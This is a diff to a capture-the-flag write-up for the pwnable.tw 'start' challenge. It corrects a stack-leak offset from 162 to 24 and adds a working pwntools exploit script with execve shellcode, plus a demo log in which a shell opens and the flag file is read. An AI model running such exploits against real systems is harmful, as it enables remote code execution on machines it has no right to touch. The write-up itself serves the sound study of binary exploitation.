@@ -230,3 +230,41 @@ During startup program exited normally.
 
 Now, 0xffffd0ac - 0xffffd00a = 162 thus if we use the first word out of stdout and add 162 to it we have a pointer to the stack.
 We just found relative offset to a randomized address. We should be able to leverage this to run some shellcode
+
+================ Finishing up =======================
+As it turns out, my original calculation for the offset was incorrect. 
+GDB (and pwndbg) disable ASLR and add some environement variables around the executable. 
+I ran the leak phase hosting the 'start' ELF in socat, then attached gdb to the process after the leak occured.
+It became apparent that the magic number was 24, not 162. With this in mind I got a reliable solution.
+
+==========> sploit <===========================
+from pwn import *
+import socket, struct
+
+shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+
+client_socket = remote('chall.pwnable.tw',10000)
+print client_socket.recv(20) # Let's start the CTF:
+
+# '\x87\x80\x04\x08' = _start+39 (mov ecx, esp)
+client_socket.send('A' * 20 + '\x87\x80\x04\x08') # leak initial esp pushed at _start+0
+eip_target = struct.unpack("<I", client_socket.recv(20)[:4])[0]
+print eip_target
+# Adding 20 bytes to the initial esp value
+eip_target = struct.pack("<I", eip_target + 24)
+print eip_target
+payload = 'A' * 20 + eip_target + '\x90' * 13 + shellcode
+
+client_socket.send(payload)
+client_socket.interactive()
+=========== Demo ====================================
+~$ python sploit.py 
+[+] Opening connection to chall.pwnable.tw on port 10000: Done
+Let's start the CTF:
+4294848960
+�1\xfe\xff
+[*] Switching to interactive mode
+$ whoami
+start
+$ cat /home/start/flag
+FLAG{... REDACTED...}
